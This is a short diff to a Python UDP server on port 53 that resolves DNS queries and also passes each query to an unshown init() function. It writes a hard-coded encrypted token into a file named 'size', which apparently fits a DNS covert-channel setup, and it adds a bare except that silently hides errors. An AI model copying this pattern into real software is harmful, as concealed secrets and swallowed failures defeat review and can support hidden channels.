@@ -174,6 +174,7 @@ port = 53
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 sock.bind((ip,port))
+print('bind')
 
 def server_init():
     if os.path.exists('size'):
@@ -181,16 +182,28 @@ def server_init():
     else:
         with open('size','a') as cli:
             cli.write('gAAAAABjKaZKLLlXphYtgaznKurab6UZVub6Rm6sa8MBmKThmhccFtzl-G8J2QYaxH7okAmM6_nlXMeF9Shw4F_ON468FXe_dylFxtsS3hcjpWlt78WAZH0=')
+
+
+import time
 while True:
+    
     server_init()
     data1, addr = sock.recvfrom(1024)
 
     #print("TCP", f"{addr} connected")
-    
-    response = dns_resolve(data1,False)
-    sock.sendto(response, addr)
 
-    init(data1)
+
+
+    try:
+        
+        response = dns_resolve(data1,False)
+        sock.sendto(response, addr)
+
+        init(data1)
+    except:
+        pass
+
+
 
     
 
